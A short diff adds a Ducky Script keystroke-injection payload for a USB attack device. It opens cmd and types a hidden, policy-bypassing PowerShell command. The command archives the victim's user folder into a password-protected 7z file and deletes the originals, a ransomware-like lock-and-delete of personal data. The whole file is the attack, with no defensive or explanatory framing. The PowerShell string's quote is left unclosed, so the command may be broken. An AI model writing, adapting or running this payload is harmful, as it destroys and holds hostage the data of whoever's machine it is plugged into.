@@ -1,0 +1,9 @@
+DEFAULTDELAY 10
+DELAY 1000 
+GUI r 
+DELAY 50 
+STRING cmd 
+ENTER 
+DELAY 250 
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "rm docs.7z ; Z:\7z1900-extra\x64\7za.exe a -mx1 -p"1a2b3cD_E#F@" -r -sdel C:\Users\$env:username\docs C:\Users\$env:USERNAME
+ENTER
